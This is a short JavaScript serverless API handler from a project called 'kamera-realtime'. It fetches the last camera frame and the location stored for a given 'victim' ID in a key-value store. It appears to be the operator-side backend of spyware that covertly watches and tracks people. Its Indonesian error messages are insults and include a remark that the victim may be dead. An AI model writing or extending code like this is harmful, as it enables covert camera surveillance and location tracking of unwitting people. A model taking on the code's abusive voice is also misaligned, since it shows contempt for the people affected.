// api/get-frame.js (di project kamera-realtime)
import { kv } from '@vercel/kv';

export default async function handler(req, res) {
    if (req.method !== 'GET') {
        return res.status(405).send('Metode tidak diizinkan, bangsat!');
    }

    const { victimId } = req.query;

    if (!victimId) {
        return res.status(400).send('ID korban tidak ada, dasar tolol!');
    }

    try {
        const imageData = await kv.get(`victim:${victimId}:lastFrame`);
        const locationData = await kv.get(`victim:${victimId}:location`);

        if (imageData) {
            res.status(200).json({
                imageData: imageData,
                location: locationData ? JSON.parse(locationData) : null
            });
        } else {
            res.status(404).send('Frame korban tidak ditemukan, mungkin udah mati!');
        }
    } catch (error) {
        console.error('Gagal mengambil frame dari KV, anjing:', error);
        res.status(500).send('Kesalahan server, kampret!');
    }
}
